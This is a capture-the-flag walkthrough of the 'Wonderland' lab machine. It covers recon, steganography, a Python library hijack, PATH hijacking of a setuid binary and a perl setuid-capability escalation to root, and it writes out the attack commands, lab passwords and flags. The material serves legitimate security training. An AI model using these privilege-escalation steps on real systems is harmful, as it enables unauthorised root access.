# Wonderland

--------------------------------------------------------------------

**TOOLS USED**: nmap, gobuster, steghide, binwalk

--------------------------------------------------------------------

## GIVEN INFO


**IP Address**: 10.10.210.160

--------------------------------------------------------------------

## PROCEDURE

### 1. RECON

-sC: script scan<br>
-sV: probe open ports to determine service/version info<br>
-oN OUTPUT_FILE: output results to given filename<br>
```
nmap -sC -sV -oN nmap.txt 10.10.210.160
```

![1.1](./imgs/1.1.png)

**EXPOSED PORT (SERVICE)**:<br>
    22 (ssh OpenSSH 7.6p1),<br>
    80 (http Golang),<br>

Enumerate hidden directories on website
```
dirb 10.10.210.160
```

![1.2](./imgs/1.2.png)

Found: /r/a, /poem

### 2. STEGANOGRAPHY

Download images in http://10.10.210.160/img/

```
binwalk ./img/*
```

![2.1](./imgs/2.1.png)

Looks like there is data hidden in alice_door.jpg

```
steghide extract -sf alice_door.jpg
```

passphrase required

try other image
```
steghide extract -sf white_rabbit_1.jpg
```

Found hint.txt

![2.2](./imgs/2.2.png)

follow the R A B B I T

http://10.10.210.160/r/a/b/b/i/t/ leads to alice_door.png

![2.3](./imgs/2.3.png)

Inspect element on http://10.10.210.160/r/a/b/b/i/t/

![2.4](./imgs/2.4.png)

found potential ssh login

**USERNAME**: alice<br>
**PASSWORD**: HowDothTheLittleCrocodileImproveHisShiningTail

### 3. SSH

log into ssh
```
ssh alice@10.10.210.160
```

HINT: everything is upside down

root.txt was in alice's home directory so user.txt should be in root

```
cat /root/user.txt
```

![3.1](./imgs/3.1.png)

**USER FLAG**: thm{"Curiouser and curiouser!"}

### 4. PIVOT TO RABBIT USER

Check user privileges
```
sudo -l
```

![4.1](./imgs/4.1.png)

alice can run /usr/bin/python3.6 and /home/alice/walrus_and_the_carpenter.py as rabbit

Inspect python program

imports library called random

![4.2](./imgs/4.2.png)

Calls the choice() method at the end

![4.3](./imgs/4.3.png)

Create new random.py file and test it out

![4.4](./imgs/4.4.png)

We can put in our own code in random.py and run the original python program as user rabbit

Modified random.py to spawn shell so when python program is run as rabbit it will create a shell for user rabbit

![4.5](./imgs/4.5.png)

Run program as rabbit
```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

![4.6](./imgs/4.6.png)

```
cd /home/rabbit
file teaParty
```

![4.7](./imgs/4.7.png)

ELF file

```
./teaParty
```

![4.8](./imgs/4.8.png)

```
cat teaParty
```

![4.9](./imgs/4.9.png)

Program is executing 
```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

```
ls -la teaParty
```

![4.10](./imgs/4.10.png)

Sticky bit is set so We can target the date command so it will be executed as root

### 5. PRIVILEGE ESCALATION

Create custom date script
```
mkdir bin
vim date
```

![5.1](./imgs/5.1.png)

Add to PATH and run teaParty
```
export PATH="/home/rabbit/bin:$PATH"
./teaParty
```

![5.2](./imgs/5.2.png)

Created hatter user shell

found password for hatter user<br>
**PASSWORD**: WhyIsARavenLikeAWritingDesk?

Run linpeas
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas
scp linpeas hatter@10.10.210.160:/home/hatter/linpeas
ssh hatter@10.10.210.160
chmod +x linpeas
./linpeas
```

![5.3](./imgs/5.3.png)

From https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/<br>
We can exploit perl capabilities<br>
Capabilities are granular escalated user privileges for certain programs<br>
Perl has the capability to use the setuid function in order to become root

Can also use this command to check capabilities<br>
2 is standard error<br>
2>/dev/null redirects stderr to /dev/null
```
getcap -r / 2>/dev/null
```

![5.4](./imgs/5.4.png)

We can use this command to exploit perl capabilities<br>
-e execute command<br>
use POSIX (setuid) imports setuid<br>
POSIX::setuid(0) sets the uid to 0 (root)
```
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

![5.4](./imgs/5.4.png)

**ROOT FLAG**: thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}